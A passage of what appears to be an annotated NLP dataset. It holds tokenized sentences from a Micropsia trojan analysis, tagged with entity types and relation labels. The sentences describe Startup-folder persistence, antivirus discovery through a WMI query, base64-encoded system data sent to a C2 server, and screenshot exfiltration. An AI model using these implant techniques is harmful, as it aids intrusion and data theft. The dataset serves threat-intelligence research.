"two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "implant", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "shortcut", "pos": [21, 22], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "implant", "pos": [5, 6], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [64, 64], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "two timers", "pos": [2, 4], "index": "4_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "preliminary system information", "pos": [6, 9], "index": "5_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [97, 97], "name": "pc ID", "pos": [2, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [109, 109], "name": "data file", "pos": [5, 7], "index": "7_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [123, 123], "name": "Computername and username", "pos": [2, 5], "index": "8_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [3, 4, 5], "h": 4, "t": 7}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 4, "t": 8}]}, {"title": "031-8", "sents": [["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "implant", "pos": [5, 6], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [33, 33], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "two timers", "pos": [2, 4], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [52, 52], "name": "preliminary system information", "pos": [6, 9], "index": "3_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [66, 66], "name": "pc ID", "pos": [2, 4], "index": "4_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [78, 78], "name": "data file", "pos": [5, 7], "index": "5_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [92, 92], "name": "Computername and username", "pos": [2, 5], "index": "6_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [120, 120], "name": "installed AV information", "pos": [1, 4], "index": "7_0"}]], "labels": [{"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 5}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 2, "t": 6}, {"r": "RD", "evidence": [2, 3, 4, 5, 6, 7], "h": 2, "t": 7}]}, {"title": "031-9", "sents": [["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [9, 9], "name": "logged-in user 's Startup folder", "pos": [9, 14], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "two timers", "pos": [2, 4], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [28, 28], "name": "preliminary system information", "pos": [6, 9], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [42, 42], "name": "pc ID", "pos": [2, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [54, 54], "name": "data file", "pos": [5, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [68, 68], "name": "Computername and username", "pos": [2, 5], "index": "5_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [96, 96], "name": "installed AV information", "pos": [1, 4], "index": "6_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [125, 125], "name": "DisplayName", "pos": [8, 9], "index": "7_0"}]], "labels": [{"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 4}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 1, "t": 5}, {"r": "RD", "evidence": [1, 2, 3, 4, 5, 6], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 1, "t": 7}]}, {"title": "031-10", "sents": [["The", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "two timers", "pos": [2, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [6, 6], "name": "preliminary system information", "pos": [6, 9], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [20, 20], "name": "pc ID", "pos": [2, 4], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [32, 32], "name": "data file", "pos": [5, 7], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [46, 46], "name": "Computername and username", "pos": [2, 5], "index": "4_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [74, 74], "name": "installed AV information", "pos": [1, 4], "index": "5_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [103, 103], "name": "DisplayName", "pos": [8, 9], "index": "6_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [106, 106], "name": "OS information", "pos": [1, 3], "index": "7_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 5}, {"r": "WR", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 6}, {"r": "RD", "evidence": [0, 1, 2, 3, 4, 5, 6, 7], "h": 0, "t": 7}]}, {"title": "031-11", "sents": [["Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."], ["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [2, 2], "name": "pc ID", "pos": [2, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [14, 14], "name": "data file", "pos": [5, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [28, 28], "name": "Computername and username", "pos": [2, 5], "index": "2_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [56, 56], "name": "installed AV information", "pos": [1, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [85, 85], "name": "DisplayName", "pos": [8, 9], "index": "4_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [88, 88], "name": "OS information", "pos": [1, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [101, 101], "name": "command line", "pos": [5, 7], "index": "6_0"}]], "labels": []}, {"title": "031-12", "sents": [["Save", "this", "value", "into", "a", "data", "file", ",", "such", "as", ":", "``", "%", "APPDATA", "%", "\\dsfjj45k.tmp", "''"], ["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "data file", "pos": [5, 7], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [19, 19], "name": "Computername and username", "pos": [2, 5], "index": "1_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [47, 47], "name": "installed AV information", "pos": [1, 4], "index": "2_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [76, 76], "name": "DisplayName", "pos": [8, 9], "index": "3_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [79, 79], "name": "OS information", "pos": [1, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [92, 92], "name": "command line", "pos": [5, 7], "index": "5_0"}]], "labels": []}, {"title": "031-13", "sents": [["Gather", "the", "Computername", "and", "username", "from", "ENV", "."], ["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [2, 2], "name": "Computername and username", "pos": [2, 5], "index": "0_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [30, 30], "name": "installed AV information", "pos": [1, 4], "index": "1_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [59, 59], "name": "DisplayName", "pos": [8, 9], "index": "2_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [62, 62], "name": "OS information", "pos": [1, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [75, 75], "name": "command line", "pos": [5, 7], "index": "4_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [113, 113], "name": "C2 server", "pos": [9, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [126, 126], "name": "Micropsia implants", "pos": [22, 24], "index": "6_0"}]], "labels": [{"r": "ST", "evidence": [7], "t": 5, "h": 6}]}, {"title": "031-14", "sents": [["Concatenate", "the", "computername", ",", "username", "and", "pcid", "into", "format", ":", "<", "COMPNAME", ">", "_", "<", "username", ">", "_", "<", "pcid", ">"], ["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."]], "vertexSet": [[{"type": "SF", "sent_id": 1, "global_pos": [22, 22], "name": "installed AV information", "pos": [1, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [51, 51], "name": "DisplayName", "pos": [8, 9], "index": "1_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [54, 54], "name": "OS information", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [67, 67], "name": "command line", "pos": [5, 7], "index": "3_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [105, 105], "name": "C2 server", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [118, 118], "name": "Micropsia implants", "pos": [22, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "implant", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [138, 138], "name": "RAT", "pos": [17, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [148, 148], "name": "C2 server", "pos": [27, 29], "index": "8_0"}]], "labels": [{"r": "ST", "evidence": [6], "t": 4, "h": 5}, {"r": "EX", "evidence": [6, 7], "h": 5, "t": 6}, {"r": "FR", "evidence": [6, 7], "h": 5, "t": 7}, {"r": "RF", "evidence": [6, 7], "h": 5, "t": 8}, {"r": "CO", "evidence": [6, 7], "h": 4, "t": 8}]}, {"title": "031-15", "sents": [["Gather", "installed", "AV", "information", "from", "the", "endpoint", "via", "``", "winmgmts", ":", "\\\\localhost\\root\\SecurityCenter2", "''", "using", "query", "``", "SELECT", "*", "FROM", "AntiVirusProduct", "''", "."], ["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": "installed AV information", "pos": [1, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [30, 30], "name": "DisplayName", "pos": [8, 9], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [33, 33], "name": "OS information", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [46, 46], "name": "command line", "pos": [5, 7], "index": "3_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [84, 84], "name": "C2 server", "pos": [9, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [97, 97], "name": "Micropsia implants", "pos": [22, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [109, 109], "name": "implant", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [117, 117], "name": "RAT", "pos": [17, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [127, 127], "name": "C2 server", "pos": [27, 29], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [131, 131], "name": "implant", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "commands", "pos": [15, 16], "index": "10_0"}]], "labels": [{"r": "ST", "evidence": [5], "t": 4, "h": 5}, {"r": "EX", "evidence": [5, 6], "h": 5, "t": 6}, {"r": "FR", "evidence": [5, 6], "h": 5, "t": 7}, {"r": "RF", "evidence": [5, 6], "h": 5, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 4, "t": 8}, {"r": "WR", "evidence": [6, 7], "h": 7, "t": 9}, {"r": "EX", "evidence": [6, 7], "h": 7, "t": 10}]}, {"title": "031-16", "sents": [["From", "the", "AV", "information", "obtained", ",", "record", "the", "DisplayName", "."], ["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "DisplayName", "pos": [8, 9], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [11, 11], "name": "OS information", "pos": [1, 3], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [24, 24], "name": "command line", "pos": [5, 7], "index": "2_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [62, 62], "name": "C2 server", "pos": [9, 11], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [75, 75], "name": "Micropsia implants", "pos": [22, 24], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [87, 87], "name": "implant", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [95, 95], "name": "RAT", "pos": [17, 18], "index": "6_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [105, 105], "name": "C2 server", "pos": [27, 29], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [109, 109], "name": "implant", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "commands", "pos": [15, 16], "index": "9_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [130, 130], "name": "C2", "pos": [1, 2], "index": "10_0"}]], "labels": [{"r": "ST", "evidence": [4], "t": 3, "h": 4}, {"r": "EX", "evidence": [4, 5], "h": 4, "t": 5}, {"r": "FR", "evidence": [4, 5], "h": 4, "t": 6}, {"r": "RF", "evidence": [4, 5], "h": 4, "t": 7}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 7}, {"r": "WR", "evidence": [5, 6], "h": 6, "t": 8}, {"r": "EX", "evidence": [5, 6], "h": 6, "t": 9}]}, {"title": "031-17", "sents": [["Get", "OS", "information", "specifically", "the", "installed", "product", "name", "."], ["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": "OS information", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "command line", "pos": [5, 7], "index": "1_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [52, 52], "name": "C2 server", "pos": [9, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "Micropsia implants", "pos": [22, 24], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [77, 77], "name": "implant", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "RAT", "pos": [17, 18], "index": "5_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [95, 95], "name": "C2 server", "pos": [27, 29], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "implant", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "commands", "pos": [15, 16], "index": "8_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [120, 120], "name": "C2", "pos": [1, 2], "index": "9_0"}]], "labels": [{"r": "ST", "evidence": [3], "t": 2, "h": 3}, {"r": "EX", "evidence": [3, 4], "h": 3, "t": 4}, {"r": "FR", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "RF", "evidence": [3, 4], "h": 3, "t": 6}, {"r": "CO", "evidence": [3, 4], "h": 2, "t": 6}, {"r": "WR", "evidence": [4, 5], "h": 5, "t": 7}, {"r": "EX", "evidence": [4, 5], "h": 5, "t": 8}]}, {"title": "031-18", "sents": [["Get", "the", "current", "implant", "'s", "command", "line", "and", "record", "it", "."], ["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "command line", "pos": [5, 7], "index": "0_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [43, 43], "name": "C2 server", "pos": [9, 11], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "Micropsia implants", "pos": [22, 24], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "implant", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "RAT", "pos": [17, 18], "index": "4_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [86, 86], "name": "C2 server", "pos": [27, 29], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [90, 90], "name": "implant", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [104, 104], "name": "commands", "pos": [15, 16], "index": "7_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [111, 111], "name": "C2", "pos": [1, 2], "index": "8_0"}]], "labels": [{"r": "ST", "evidence": [2], "t": 1, "h": 2}, {"r": "EX", "evidence": [2, 3], "h": 2, "t": 3}, {"r": "FR", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "RF", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "CO", "evidence": [2, 3], "h": 1, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 4, "t": 6}, {"r": "EX", "evidence": [3, 4], "h": 4, "t": 7}]}, {"title": "031-19", "sents": [["All", "this", "data", "gathered", "from", "the", "system", "is", "individually", "base64-encoded", "and", "assigned", "to", "HTTP", "form", "query", "variables", "with", "the", "following", "name-value", "pairs", ":"], ["The", "data", "is", "then", "sent", "to", "the", "implant", "'s", "C2", "server", "via", "an", "HTTP", "POST", "request", ",", "which", "is", "fairly", "standard", "in", "Micropsia", "implants", "."], ["Once", "the", "preliminary", "information", "has", "been", "sent", ",", "the", "implant", "now", "begins", "its", "remote", "access", "trojan", "(", "RAT", ")", "activity", "and", "waits", "for", "command", "codes", "from", "the", "C2", "server", "."], ["The", "implant", "now", "uses", "two", "additional", "HTTP", "form", "variables", "to", "transmit", "the", "output", "of", "the", "commands", "executed", "on", "the", "endpoint", ":"], ["The", "C2", "issues", "distinct", "command", "codes", "to", "the", "implant", "to", "carry", "out", "various", "actions", "on", "the", "infected", "endpoint", "."], ["The", "commands", "follow", "the", "format", ":", ";", "<", "cmd_code", ">", ";", "<", "base64_encoded_supporting_data", ">", ";"], ["The", "above", "example", "would", "run", "the", "ipconfig", "command", "on", "the", "endpoint", "."], ["``", "1", "''", "or", "``", "2", "''", "or", "``", "sh", "''", "Capture", "screenshots", "to", "the", "%", "TEMP", "%", "directory", "and", "exfiltrate", "."]], "vertexSet": [[{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "C2 server", "pos": [9, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "Micropsia implants", "pos": [22, 24], "index": "1_0"}], [{"type": "MF", "sent_id": 2, 